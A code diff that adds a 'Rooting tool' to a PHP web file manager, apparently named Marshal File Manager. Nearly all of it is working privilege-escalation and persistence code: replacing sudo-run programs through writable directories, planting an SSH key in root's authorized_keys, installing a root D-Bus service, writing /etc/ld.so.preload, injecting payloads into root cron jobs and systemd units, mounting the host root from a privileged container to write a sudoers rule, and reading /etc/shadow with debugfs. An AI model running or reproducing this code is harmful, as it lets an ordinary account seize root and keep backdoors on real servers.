+            ['bin' => 'podman', 'why' => 'the container method when docker is absent but its socket answers'],
+            ['bin' => 'ssh', 'why' => 'the SSH key method: proving the key by logging in as root on this host'],
+            ['bin' => 'ssh-keygen', 'why' => 'the SSH key method: making the key pair'],
+            ['bin' => 'debugfs', 'why' => 'the disk group route: reading /etc/shadow off the raw filesystem to prove it'],
+            ['bin' => 'cc', 'why' => 'building the small library of the preload routes (gcc, clang or tcc serve as well)'],
             ['bin' => 'dpkg', 'why' => 'the Packages control: dpkg --audit as root'],
             ['bin' => 'nft', 'why' => 'the Firewall control: reading the ruleset as root'],
             ['bin' => 'ss', 'why' => 'the Network control: every socket as root'],
@@ -10812,13 +11273,16 @@ class FileManager {
                        'rootState', 'rootLogTail', 'rootPhpBin', 'rootPaths', 'rootDaemonInfo', 'rootChannels',
                        'rootChannelNeeds', 'rootProbeArgv', 'rootProofOk', 'rootControls', 'rootSplitLine',
                        'rootPolkitRule', 'rootStateFile', 'rootLogFile',
-                       'rootGrants'];
+                       'rootGrants', 'rootGroups', 'rootDiskDetect', 'rootK8s', 'rootPrivContainer',
+                       'rootNfsSquash', 'rootPathHijack', 'rootDepScan'];
         $routeFns = ['rootIdentity', 'rootSuidEscapes', 'rootCapEscape', 'rootFire', 'rootAs', 'rootInstallHelper',
                      'rootDaemonRun', 'rootDaemonStart', 'rootDaemonStop', 'rootChannelInstall', 'rootChannelVerify',
                      'rootChannelRemove', 'rootRun', 'rootingInstallRoot', 'rootingStep', 'rootingControl', 'rootingUninstall',
                      'rootingRooted',
                      'rootRemoveHelper', 'rootHarden', 'rootVerify', 'rootExec',
-                     'rootSuProbe', 'rootSuExec', 'rootSuSpawn', 'rootChannelInstallSu'];
+                     'rootSuProbe', 'rootSuExec', 'rootSuSpawn', 'rootChannelInstallSu',
+                     'rootSudoDeepAttempts', 'rootBuildPreloadSo', 'rootDiskProof',
+                     'rootChannelInstallBindRepl', 'rootChannelInstallSshKey', 'rootChannelInstallDbus', 'rootSshKeyRun'];
         $leaks = [];
         $pure = 0;
         foreach($measureFns as $fn){
@@ -10936,6 +11400,7 @@ class FileManager {
         $base = $this->rootLibBase();
         return[
             'suphp'  => $base . '/.suphp',
+            'sshkey' => $base . '/.sshkey',
             'capphp' => $base . '/.capphp',
             'subash' => $base . '/.subash',
             'spool'  => $base . '/spool',
@@ -11197,6 +11662,15 @@ class FileManager {
             $s = $this->rootPlantSpec($id);
             if($s)$add($id, $s['name'], $s['kind'], $s['idea']);
         }
+        /* 3b - neither planted files nor things the machine carries whole:
+           a program replaced through its own directory, a key left with
+           sshd, a service the system bus starts as root */
+        $add('bindrepl', 'A program sudo lets this account run, replaced through its directory', 'session',
+             'The program itself is root-owned and cannot be touched - but it stands in a directory this account may write, so it can be moved aside inside that directory and a replacement put in its place. The next time it runs through sudo, the replacement runs as root: it leaves the validated rule behind, puts the original back, and runs it. Nothing about the program changes for anyone else, before or after.');
+        $add('sshkey', 'A key in the SSH file of the root account', 'planted',
+             'Where the SSH directory of the root account may be written, one public key of this manager is added to it. sshd then lets this manager in as root with the matching private key, which never leaves this machine, and the first thing done through it is leaving the validated rule behind. If sshd is off, or refuses root key logins, the key simply waits.');
+        $add('dbussvc', 'A service the system bus starts as root', 'planted',
+             'The system bus starts the services named in its service directories, as root where the file says so. Where one of those directories may be written, a small service of this manager is placed there: the next call to its name starts the payload as uid 0.');
         /* 3 - an account database that this account may write */
         $add('passwd', 'An extra uid-0 account', 'persistent',
              'If the account database itself is writable, a second account with uid 0 is added: su then walks straight into root without touching sudo or a setuid bit.');
@@ -11272,6 +11746,26 @@ class FileManager {
             case 'docker':
                 $d = $this->rootDocker();
                 return['ok' => !empty($d['reachable']), 'note' => $d['socket'] !== '' ? ('a socket at ' . $d['socket']) : 'no container socket is reachable'];
+            case 'bindrepl':
+                $bf = $this->rootBindReplFind();
+                return['ok' => $bf !== null,
+                       'note' => $bf === null ? 'no program this account may run through sudo stands in a writable directory'
+                                              : $bf['bin'] . ' is root-owned, but ' . $bf['dir'] . ' may be written by this account, so the program may be moved aside and replaced'];
+            case 'sshkey':
+                $akOk = @is_writable('/root/.ssh/authorized_keys')
+                    || (@is_dir('/root/.ssh') && @is_writable('/root/.ssh'))
+                    || (@is_dir('/root') && @is_writable('/root'));
+                $tools = $this->rootWhich('ssh-keygen') !== '' && $this->rootWhich('ssh') !== '';
+                return['ok' => $akOk && $tools,
+                       'note' => !$tools ? 'ssh or ssh-keygen is not installed on this host'
+                                         : ($akOk ? 'the SSH file of the root account may be written by this account' : 'the SSH directory of the root account is root-only, as it should be')];
+            case 'dbussvc':
+                $svcDir = '';
+                foreach(['/usr/share/dbus-1/system-services', '/etc/dbus-1/system-services', '/usr/local/share/dbus-1/system-services'] as $d)
+                    if(@is_dir($d) && @is_writable($d)){$svcDir = $d; break;}
+                return['ok' => $svcDir !== '' && $this->rootWhich('dbus-send') !== '',
+                       'note' => $svcDir === '' ? 'no system-bus service directory may be written by this account'
+                                                : 'the system-bus service directory ' . $svcDir . ' may be written by this account'];
             default:
                 if($this->rootEscSpec($id)){
                     $f = $this->rootEscFind($id);
@@ -11355,6 +11849,15 @@ class FileManager {
         if($id === 'rootd'){
             $res = $this->rootDaemonRun(['cat', '/proc/self/status'], 12);
             return['ok' => $this->rootProofOk('rootd', $res), 'res' => $res];
+        }
+        if($id === 'sshkey'){
+            $res = $this->rootSshKeyRun('id', '', 15);
+            $txt = trim((string)($res['out'] ?? '') . ' ' . (string)($res['err'] ?? ''));
+            return['ok' => preg_match('/\buid=0\(root\)/', $txt) === 1, 'res' => $res];
+        }
+        if($id === 'bindrepl' || $id === 'dbussvc'){
+            $res = $this->rootExec(['sudo', '-n', 'cat', '/proc/self/status'], '', 15);
+            return['ok' => $this->rootHelperInstalled() && $this->rootUidOf((string)($res['out'] ?? '')) === 0, 'res' => $res];
         }
         $res = $this->rootExec($this->rootProbeArgv($id), '', 20);
         if($id === 'suidbash' || $id === 'polkitrule' || $id === 'sudoers'){
@@ -11488,6 +11991,12 @@ class FileManager {
                 return $this->rootChannelInstallAccount($password);
             case 'docker':
                 return $this->rootChannelInstallDocker($password);
+            case 'bindrepl':
+                return $this->rootChannelInstallBindRepl($password);
+            case 'sshkey':
+                return $this->rootChannelInstallSshKey();
+            case 'dbussvc':
+                return $this->rootChannelInstallDbus();
             default:
                 if($this->rootEscSpec($id)){
                     /* there is nothing to install: the machine already carries
@@ -11612,12 +12121,151 @@ class FileManager {
                'secret' => ['user' => $name, 'pass' => $pass]];
     }
     private function rootChannelInstallDocker($password = ''){
+        $cli = $this->rootWhich('docker') !== '' ? 'docker' : 'podman';
+        if($cli === 'podman' && $this->rootWhich('podman') === '')return['ok' => false, 'note' => 'a container socket answers, but neither docker nor podman is installed to speak to it'];
         $mgr = $this->managerAccount();
         $rule = $this->rootHelperContent();
         $b64 = base64_encode($rule);
         $cmd = 'base64 -d > /host/etc/sudoers.d/90-marshal-fm <<< "' . $b64 . '" && chmod 0440 /host/etc/sudoers.d/90-marshal-fm && chown root:root /host/etc/sudoers.d/90-marshal-fm';
-        $r = $this->rootExec(['docker', 'run', '--rm', '--privileged', '-v', '/:/host', '-i', 'alpine', 'sh', '-c', $cmd], '', 90);
+        $r = $this->rootExec([$cli, 'run', '--rm', '--privileged', '-v', '/:/host', '-i', 'alpine', 'sh', '-c', $cmd], '', 90);
         return['ok' => $r['rc'] === 0, 'note' => $r['rc'] === 0 ? 'the container wrote the rule on the host as root' : ('the container route failed: ' . ($r['out'] ?: $r['err']) . ' - it needs an image it can start')];
+    }
+    /* The ssh runner of the sshkey method: one key, one account, this host. */
+    private function rootSshKeyRun($remote, $stdin = '', $timeout = 20){
+        $p = $this->rootPaths();
+        $key = (string)($p['sshkey'] ?? '');
+        if($key === '' || !@is_file($key))return['rc' => 127, 'out' => '', 'err' => 'no root SSH key has been planted'];
+        $argv = ['ssh', '-i', $key, '-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no',
+                 '-o', 'UserKnownHostsFile=/dev/null', '-o', 'ConnectTimeout=6', 'root@127.0.0.1'];
+        if((string)$remote !== '')$argv[] = (string)$remote;
+        return $this->rootExec($argv, (string)$stdin, $timeout);
+    }
+    private function rootSshKeyRunArgv($argv, $timeout = 20){
+        $remote = implode(' ', array_map('escapeshellarg', array_map('strval', (array)$argv)));
+        return $this->rootSshKeyRun($remote, '', $timeout);
+    }
+    private function rootChannelInstallBindRepl($password = ''){
+        $f = $this->rootBindReplFind();
+        if($f === null)return['ok' => false, 'note' => 'no program this account may run through sudo stands in a directory it may write'];
+        $bin = $f['bin'];
+        $bak = $f['dir'] . '/.' . basename($bin) . '.fm-orig';
+        if(@is_file($bak))return['ok' => true, 'planted' => true, 'when' => 'the next time ' . $bin . ' runs through sudo',
+                                 'note' => $bin . ' was already replaced earlier and is waiting for its next run through sudo'];
+        $wrapper = "#!/bin/sh
+"
+            . "# Marshal File Manager - planted by the Rooting tool (bindrepl).
+"
+            . "# Runs the original, unless it is root: then it leaves the validated
+"
+            . "# rule behind, puts the original back, and runs that instead.
+"
+            . "ORIG='" . $bak . "'
+SELF='" . $bin . "'
+"
+            . 'if [ "$(id -u 2>/dev/null)" = "0" ]; then' . "
+"
+            . "  cat > /etc/sudoers.d/90-marshal-fm <<'MFMROOTEOF'
+"
+            . $this->rootHelperContent()
+            . "MFMROOTEOF
+"
+            . "  chmod 0440 /etc/sudoers.d/90-marshal-fm 2>/dev/null
+"
+            . "  chown 0:0 /etc/sudoers.d/90-marshal-fm 2>/dev/null
+"
+            . '  mv -f "$ORIG" "$SELF" 2>/dev/null' . "
+"
+            . '  exec "$SELF" "$@"' . "
+"
+            . "fi
+"
+            . 'exec "$ORIG" "$@"' . "
+";
+        if(!@rename($bin, $bak))return['ok' => false, 'note' => 'the program could not be moved aside inside ' . $f['dir']];
+        if(@file_put_contents($bin, $wrapper) === false){
+            @rename($bak, $bin);
+            return['ok' => false, 'note' => 'the replacement could not be written, so the original was put back'];
+        }
+        @chmod($bin, 0755);
+        $st = $this->rootState();
+        $st['bindrepl'] = ['bin' => $bin, 'bak' => $bak, 'at' => time()];
+        $this->rootStateSave($st);
+        $this->rootExec(['sudo', '-n', $bin, '--version'], '', 20);
+        if($password !== '' && !$this->rootHelperInstalled())
+            $this->rootExec(['sudo', '-S', '-k', '-p', '', $bin, '--version'], $password . "
+", 20);
+        $won = $this->rootHelperInstalled();
+        return['ok' => true, 'fired' => $won, 'planted' => !$won, 'when' => 'the next time ' . $bin . ' runs through sudo',
+               'note' => $won ? $bin . ' ran through sudo, left the rule behind and put itself back'
+                              : $bin . ' was replaced through ' . $f['dir'] . ', and puts itself back the first time it runs through sudo'];
+    }
+    private function rootChannelInstallSshKey(){
+        $p = $this->rootPaths();
+        $key = (string)($p['sshkey'] ?? '');
+        if($key === '' || $this->rootWhich('ssh-keygen') === '' || $this->rootWhich('ssh') === '')
+            return['ok' => false, 'note' => 'ssh or ssh-keygen is not installed on this host'];
+        $ak = '/root/.ssh/authorized_keys';
+        $can = @is_writable($ak) || (@is_dir('/root/.ssh') && @is_writable('/root/.ssh')) || (@is_dir('/root') && @is_writable('/root'));
+        if(!$can)return['ok' => false, 'note' => 'the SSH file of the root account may not be written by this account'];
+        if(!@is_file($key)){
+            $r = $this->rootExec(['ssh-keygen', '-t', 'ed25519', '-N', '', '-f', $key], '', 20);
+            if($r['rc'] !== 0 || !@is_file($key))$r = $this->rootExec(['ssh-keygen', '-t', 'rsa', '-b', '2048', '-N', '', '-f', $key], '', 30);
+            if(!@is_file($key))return['ok' => false, 'note' => 'a key pair could not be made'];
+            @chmod($key, 0600);
+        }
+        $pub = trim((string)@file_get_contents($key . '.pub'));
+        if($pub === '')return['ok' => false, 'note' => 'the public key could not be read'];
+        if(!@is_dir('/root/.ssh'))@mkdir('/root/.ssh', 0700);
+        $was = @is_file($ak) ? (string)@file_get_contents($ak) : null;
+        if($was === null || strpos($was, $pub) === false){
+            if(@file_put_contents($ak, ($was === null ? '' : rtrim($was, "
+") . "
+") . $pub . "
+") === false)
+                return['ok' => false, 'note' => $ak . ' would not take the key'];
+            @chmod($ak, 0600);
+        }
+        $st = $this->rootState();
+        $st['sshkey'] = ['ak_was' => $was, 'at' => time()];
+        $this->rootStateSave($st);
+        $res = $this->rootSshKeyRun('id', '', 15);
+        $txt = trim((string)($res['out'] ?? '') . ' ' . (string)($res['err'] ?? ''));
+        if(preg_match('/\buid=0\(root\)/', $txt) === 1){
+            $this->rootSshKeyRun('cat > /etc/sudoers.d/90-marshal-fm && chmod 0440 /etc/sudoers.d/90-marshal-fm && chown 0:0 /etc/sudoers.d/90-marshal-fm',
+                                 $this->rootHelperContent(), 20);
+            return['ok' => true, 'fired' => true,
+                   'note' => 'sshd let this manager in as root with the key, and the validated rule was left behind through it'];
+        }
+        return['ok' => true, 'planted' => true, 'when' => 'the next time sshd accepts a root key login',
+               'note' => 'the key is in ' . $ak . ', but sshd did not let it in just now (it may be stopped, or root key logins may be refused) - the key waits, and works the moment they are allowed'];
+    }
+    private function rootChannelInstallDbus(){
+        if($this->rootWhich('dbus-send') === '')return['ok' => false, 'note' => 'there is no dbus-send on this host'];
+        $dir = '';
+        foreach(['/usr/share/dbus-1/system-services', '/etc/dbus-1/system-services', '/usr/local/share/dbus-1/system-services'] as $d)
+            if(@is_dir($d) && @is_writable($d)){$dir = $d; break;}
+        if($dir === '')return['ok' => false, 'note' => 'no system-bus service directory may be written by this account'];
+        $w = $this->rootPlantWrite('dbussvc');
+        if(empty($w['ok']))return $w;
+        $file = $dir . '/com.marshal.fm.Root.service';
+        $body = "[D-BUS Service]
+Name=com.marshal.fm.Root
+Exec=/bin/sh " . $w['payload'] . "
+User=root
+";
+        if(@file_put_contents($file, $body) === false)return['ok' => false, 'note' => 'the service file could not be written to ' . $file];
+        $st = $this->rootState();
+        $st['dbussvc'] = ['file' => $file, 'at' => time()];
+        $this->rootStateSave($st);
+        $this->rootExec(['dbus-send', '--system', '--print-reply', '--dest=com.marshal.fm.Root', '/', 'org.freedesktop.DBus.Introspectable.Introspect'], '', 25);
+        for($i = 0; $i < 6; $i++){
+            if($this->rootPlantProofOk('dbussvc') || $this->rootHelperInstalled())break;
+            sleep(1);
+        }
+        $won = $this->rootPlantProofOk('dbussvc') || $this->rootHelperInstalled();
+        return['ok' => true, 'fired' => $won, 'planted' => !$won, 'when' => 'the next call to its name on the system bus',
+               'note' => $won ? 'the system bus started the service as root, and the payload left the rule behind'
+                              : 'the service is at ' . $file . ' - the bus starts it as root the next time its name is called'];
     }
     private function rootChannelRemove($id, $password = ''){
         $p = $this->rootPaths();
@@ -11654,6 +12302,39 @@ class FileManager {
                 unset($st['account']);
                 $this->rootStateSave($st);
                 return['ok' => true, 'note' => 'the extra account was taken back out of /etc/passwd and /etc/shadow'];
+            case 'bindrepl':
+                $stB = $this->rootState();
+                $bb = (array)($stB['bindrepl'] ?? []);
+                $doneB = false;
+                if(!empty($bb['bak']) && !empty($bb['bin']) && @is_file((string)$bb['bak'])){
+                    $cur = @is_file((string)$bb['bin']) ? (string)@file_get_contents((string)$bb['bin']) : '';
+                    if($cur === '' || strpos($cur, 'bindrepl') !== false)$doneB = @rename((string)$bb['bak'], (string)$bb['bin']);
+                }
+                unset($stB['bindrepl']);
+                $this->rootStateSave($stB);
+                return['ok' => true, 'note' => $doneB ? 'the original program was put back in place of the replacement' : 'no replacement was left in place'];
+            case 'sshkey':
+                $stK = $this->rootState();
+                $kk = (array)($stK['sshkey'] ?? []);
+                $akF = '/root/.ssh/authorized_keys';
+                if(array_key_exists('ak_was', $kk)){
+                    if($kk['ak_was'] === null){if(@is_file($akF))@unlink($akF);}
+                    else @file_put_contents($akF, (string)$kk['ak_was']);
+                }
+                $pK = $this->rootPaths();
+                if(!empty($pK['sshkey'])){@unlink((string)$pK['sshkey']); @unlink((string)$pK['sshkey'] . '.pub');}
+                unset($stK['sshkey']);
+                $this->rootStateSave($stK);
+                return['ok' => true, 'note' => 'the key was taken out of ' . $akF . ' and the key pair was deleted'];
+            case 'dbussvc':
+                foreach(['/usr/share/dbus-1/system-services/com.marshal.fm.Root.service', '/etc/dbus-1/system-services/com.marshal.fm.Root.service', '/usr/local/share/dbus-1/system-services/com.marshal.fm.Root.service'] as $sf)
+                    if(@is_file($sf))@unlink($sf);
+                foreach([$this->rootPlantPayloadPath('dbussvc'), $this->rootPlantProofPath('dbussvc')] as $pf)
+                    if((string)$pf !== '')@unlink((string)$pf);
+                $stD = $this->rootState();
+                unset($stD['dbussvc']);
+                $this->rootStateSave($stD);
+                return['ok' => true, 'note' => 'the bus service was removed'];
             default:
                 if($this->rootEscSpec($id))
                     return['ok' => true, 'note' => 'nothing to remove: this method wrote nothing, it only used what the machine already had'];
@@ -11707,6 +12388,11 @@ class FileManager {
             $r = $this->rootViaAccount($argv, $timeout);
             $tries[] = ['via' => 'the uid-0 account', 'rc' => (int)$r['rc']];
             if($r['rc'] === 0)return $r + ['ok' => true, 'tries' => $tries];
+        }
+        if(@is_file((string)($p['sshkey'] ?? ''))){
+            $r = $this->rootSshKeyRunArgv($argv, $timeout);
+            $tries[] = ['via' => 'the root SSH key', 'rc' => (int)$r['rc']];
+            if($r['rc'] === 0)return $r + ['ok' => true, 'via' => 'the root SSH key', 'tries' => $tries];
         }
         return['ok' => false, 'rc' => -1, 'out' => '', 'err' => 'no installed method answered', 'via' => 'none', 'tries' => $tries];
     }
@@ -11846,6 +12532,18 @@ class FileManager {
             'idea' => 'A cgroup hierarchy of the first kind runs one program, as root, the moment the last process in a group goes away. Where release_agent and notify_on_release may be written by an ordinary account, this tool makes a group of its own, names its script in it, and lets the group empty: the kernel does the rest, and the group is then removed.',
         ],
         /* ── files root owns that this account may write ─────────────────── */
+        'ldpreload' => [
+            'name' => 'A library the loader puts into every root program', 'kind' => 'planted', 'driver' => 'ldpreload',
+            'cand' => ['/etc/ld.so.preload'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time any program runs as root on this machine - a login, a schedule, a service',
+            'idea' => 'The dynamic loader reads /etc/ld.so.preload before anything else and loads what it names into every program, root\'s included. Where that file may be written by an ordinary account, one line naming this manager\'s library is enough: the library does nothing at all in ordinary hands, and in the hands of uid 0 it leaves the validated sudo rule behind and writes its proof. The file it had is kept, so it can be put back exactly.',
+        ],
+        'depchain' => [
+            'name' => 'Something root already runs, that this account may write', 'kind' => 'planted', 'driver' => 'depchain',
+            'cand' => [], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time the service or schedule that was found does what it always does',
+            'idea' => 'No fixed directory is guessed at: what root runs on this machine is taken apart - the units and schedules themselves, the programs they name, the files they read. The first piece this account may write is where the payload goes. It is the method that finds the door a machine built for itself, and what it touched is kept so it can be put back.',
+        ],
         'shadow' => [
             'name' => 'A password written into /etc/shadow', 'kind' => 'planted', 'driver' => 'shadow',
             'cand' => ['/etc/shadow'], 'fire' => 'now', 'wait' => 25,
@@ -12396,6 +13094,23 @@ class FileManager {
                 ? (string)($h['note'] ?? 'no program the machine schedules is writable by this account')
                 : 'the job at ' . $h['file'] . ' is run as root by the machine, and this account may write it'];
         }
+        if($drv === 'ldpreload'){
+            $cc = '';
+            foreach(['cc', 'gcc', 'clang', 'tcc'] as $c)if($this->rootWhich($c) !== ''){$cc = $c; break;}
+            $w = @is_writable('/etc/ld.so.preload') || (!@is_file('/etc/ld.so.preload') && @is_dir('/etc') && @is_writable('/etc'));
+            if(!$w)return['ok' => false, 'note' => '/etc/ld.so.preload is root-only, as it should be'];
+            if($cc === '')return['ok' => false, 'note' => 'the preload file may be written, but no C compiler is on this host to build the library'];
+            return['ok' => true, 'note' => '/etc/ld.so.preload may be written by this account, and ' . $cc . ' can build the library'];
+        }
+        if($drv === 'depchain'){
+            $scan = $this->rootDepScan();
+            if(!$scan)return['ok' => false, 'note' => 'everything root runs on this machine - units, schedules, the programs they name - is root-only'];
+            $plantable = false;
+            foreach($scan as $f)if(in_array($f['kind'], ['script', 'unitfile', 'cronfile'], true))$plantable = true;
+            return['ok' => $plantable,
+                   'note' => $plantable ? $scan[0]['path'] . ': ' . $scan[0]['note'] . ' (found in ' . $scan[0]['source'] . ')'
+                                        : 'root runs things this account may touch, but only in ways that run no command: ' . $scan[0]['note']];
+        }
         $t = $this->rootPlantTarget($id);
         if($t === null){
             return['ok' => false, 'note' => in_array($drv, ['append', 'group', 'shadow'], true)
@@ -12454,7 +13169,7 @@ class FileManager {
         }
         if($this->rootPlantDir() === '')return['ok' => false, 'note' => 'this manager has no writable directory of its own to put the payload in'];
         $drv = (string)($s['driver'] ?? '');
-        if($drv !== 'kernel' && $drv !== 'hijacksched' && $this->rootPlantTarget($id) === null)
+        if($drv !== 'kernel' && $drv !== 'hijacksched' && $drv !== 'ldpreload' && $drv !== 'depchain' && $this->rootPlantTarget($id) === null)
             return['ok' => false, 'note' => 'the place it wanted stopped being writable'];
         $w = $this->rootPlantWrite($id);
         if(empty($w['ok']))return $w;
@@ -12496,6 +13211,8 @@ class FileManager {
         case 'modprobehook':return $this->rootPlantModHook($id, $s, $dir, $rec);
         case 'tmpfiles':    return $this->rootPlantTmpfiles($id, $s, $dir, $rec);
         case 'yumplugin':   return $this->rootPlantYum($id, $s, $dir, $rec);
+        case 'ldpreload':   return $this->rootPlantLdPreload($id, $s, $rec);
+        case 'depchain':    return $this->rootPlantDepWrite($id, $s, $rec);
         case 'newfile':
             $base = (string)($s['base'] ?? 'mfm-root');
             $ext  = (string)($s['ext'] ?? '');
@@ -12511,6 +13228,71 @@ class FileManager {
             return['ok' => true, 'note' => 'a file was planted at ' . $path, 'rec' => $rec];
         }
         return['ok' => false, 'note' => 'this method has no driver'];
+    }
+    private function rootPlantLdPreload($id, $s, &$rec){
+        $f = '/etc/ld.so.preload';
+        $so = $this->rootBuildPreloadSo($this->rootPlantProofPath($id));
+        if($so === '')return['ok' => false, 'note' => 'no C compiler (cc, gcc, clang or tcc) is on this host to build the library'];
+        if(@is_file($f)){
+            if(!@is_writable($f))return['ok' => false, 'note' => $f . ' stopped being writable'];
+            $was = (string)@file_get_contents($f);
+            if(strpos($was, $so) === false){
+                if(@file_put_contents($f, ($was === '' ? '' : rtrim($was, "
+") . "
+") . $so . "
+") === false)
+                    return['ok' => false, 'note' => 'the preload file would not take the line'];
+            }
+            $rec['restore'][] = ['file' => $f, 'was' => $was];
+            $rec['target'] = $f;
+        }elseif(@is_dir('/etc') && @is_writable('/etc')){
+            if(@file_put_contents($f, $so . "
+") === false)return['ok' => false, 'note' => 'the preload file could not be created'];
+            @chmod($f, 0644);
+            $rec['files'][] = $f;
+            $rec['target'] = $f;
+        }else return['ok' => false, 'note' => $f . ' is not writable and may not be created'];
+        $rec['files'][] = $so;
+        return['ok' => true, 'note' => 'the loader now names this manager\'s library in ' . $f . ', and the next program the machine runs as root will load it', 'rec' => $rec];
+    }
+    /* The first writable piece of what root runs gets the payload; whatever
+       it was is kept whole, so taking the method out puts it back. */
+    private function rootPlantDepWrite($id, $s, &$rec){
+        $scan = $this->rootDepScan();
+        $payload = $this->rootPlantPayloadPath($id);
+        $nonce = $this->rootPlantNonce($id);
+        foreach($scan as $f){
+            $path = (string)$f['path'];
+            if($f['kind'] === 'script' || $f['kind'] === 'cronfile'){
+                $was = (string)@file_get_contents($path);
+                if($was === '' || strpos($was, $nonce) !== false)continue;
+                $line = $f['kind'] === 'cronfile'
+                    ? "
+# mfm " . $nonce . " - planted by the Rooting tool
+* * * * * root /bin/sh '" . $payload . "'
+"
+                    : "
+# mfm " . $nonce . " - planted by the Rooting tool
+/bin/sh '" . $payload . "'
+";
+                if(@file_put_contents($path, $was . $line) === false)continue;
+                $rec['restore'][] = ['file' => $path, 'was' => $was];
+                $rec['target'] = $path;
+                return['ok' => true, 'note' => 'the payload was planted in ' . $path . ', which root runs from ' . $f['source'], 'rec' => $rec];
+            }
+            if($f['kind'] === 'unitfile'){
+                $was = (string)@file_get_contents($path);
+                if($was === '' || strpos($was, $nonce) !== false || strpos($was, '[Service]') === false)continue;
+                $add = "[Service]
+# mfm " . $nonce . " - planted by the Rooting tool
+ExecStartPost=/bin/sh '" . $payload . "'";
+                if(@file_put_contents($path, str_replace('[Service]', $add, $was)) === false)continue;
+                $rec['restore'][] = ['file' => $path, 'was' => $was];
+                $rec['target'] = $path;
+                return['ok' => true, 'note' => 'a line was planted in the unit ' . $path . ' - it fires the next time the service is started after a daemon-reload, which every boot performs', 'rec' => $rec];
+            }
+        }
+        return['ok' => false, 'note' => 'what root runs is writable only in ways that run no command'];
     }
     private function rootPlantAppend($id, $s, $file, &$rec){
         $body = $this->rootPlantFill($id, (string)($s['body'] ?? ''));
@@ -12769,7 +13551,7 @@ class FileManager {
         $st = $this->rootState();
         $rec = is_array($st['plants'] ?? null) ? ($st['plants'][$id] ?? null) : null;
         $paths = [$this->rootPlantPayloadPath($id), $this->rootPlantProofPath($id),
-                  $this->rootPlantRulePath($id), $this->rootPlantLogPath($id)];
+                  $this->rootPlantRulePath($id), $this->rootPlantLogPath($id), $this->rootPreloadSoPath()];
         if(!is_array($rec)){
             foreach($paths as $f)if((string)$f !== '')@unlink((string)$f);
             return['ok' => true, 'note' => 'nothing was on record for this method, so its files were cleaned up'];
@@ -13009,6 +13791,9 @@ class FileManager {
         if(!empty($state['channel'])){
             $p = $this->rootPaths();
             $marks = ['sudoers' => @is_file($this->rootSudoersFile()), 'rootd' => $daemon['alive'],
+                      'sshkey' => @is_file((string)($p['sshkey'] ?? '')),
+                      'dbussvc' => @is_file('/usr/share/dbus-1/system-services/com.marshal.fm.Root.service') || @is_file('/etc/dbus-1/system-services/com.marshal.fm.Root.service'),
+                      'bindrepl' => !empty($state['bindrepl']['bak']) && @is_file((string)($state['bindrepl']['bak'] ?? '')),
                       'suidphp' => @is_file($p['suphp']), 'suidbash' => @is_file($p['subash']),
                       'polkitrule' => @is_file($p['polkit']), 'setcapphp' => @is_file($p['capphp']),
                       'passwd' => $this->rootAccountExists(), 'docker' => @is_file($this->rootSudoersFile()),
@@ -13056,7 +13841,7 @@ class FileManager {
     public function rootingUninstall($password = ''){
         $state = $this->rootState();
         $log = [];
-        $ids = ['suroute', 'rootd', 'sudoers', 'suidphp', 'suidbash', 'polkitrule', 'setcapphp', 'passwd'];
+        $ids = ['suroute', 'rootd', 'sudoers', 'suidphp', 'suidbash', 'polkitrule', 'setcapphp', 'passwd', 'bindrepl', 'sshkey', 'dbussvc'];
         foreach($ids as $id){
             $r = $this->rootChannelRemove($id, $password);
             $log[] = ['id' => $id, 'ok' => !empty($r['ok']), 'note' => (string)$r['note']];
